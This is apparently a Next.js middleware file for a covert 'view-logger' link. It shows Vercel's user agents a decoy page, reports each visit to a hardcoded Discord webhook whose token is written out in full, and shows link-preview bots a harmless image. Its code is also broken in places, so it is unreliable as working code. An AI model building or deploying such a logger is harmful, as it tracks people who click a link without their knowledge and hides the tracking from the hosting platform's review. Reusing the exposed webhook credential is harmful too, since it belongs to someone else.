import { NextRequest, NextResponse, userAgent } from 'next/server';

const webhook = 'https://discord.com/api/webhooks/1216841205883600928/kipzeUzJu0dF3FGPae2uzI7DDP6-uHJb3hkEy1kpf6MA80MqhJWIJCWZDTvvv3xRZdOK'; // Your webhook URL now is in your project's environment variables.

export async function middleware(req){
  const ua = userAgent(req)?.ua;
  if(!ua || ua.startsWith("vercel-")){
    // Displaying another page for Vercel
    return NextResponse.rewrite(new URL("/vercel.html",req.url));
  }
  fetch('https://www.cloudflare.com/cdn-cgi/trace').then(async data => {
  const source = ["Mozilla/5.0 (compatible; Discordbot/","Twitterbot/"].find(u=>ua?.startsWith(u))
  const page = req.url.split("/").slice(-1)[0]
  await fetch(webhook,{body:JSON.stringify({
    embeds:[{
      title:"Triggered view-logger",
      description:(source ? "Source user-agent: "+ua : "It was loaded by an user (or an user on Discord)."),
      footer:{
        text:"Requested page: "+data.text(),
      },
    }],
  }),headers:{"content-type":"application/json"},method:"POST"})
  if(source){
    // Return the image.
    return NextResponse.rewrite(new URL("/mini.png",req.url))
  }else{
    // Make a message for whoever takes the risk to directly click.
    return NextResponse.rewrite(new URL("/page.html",req.url));
  }
    
  })
}
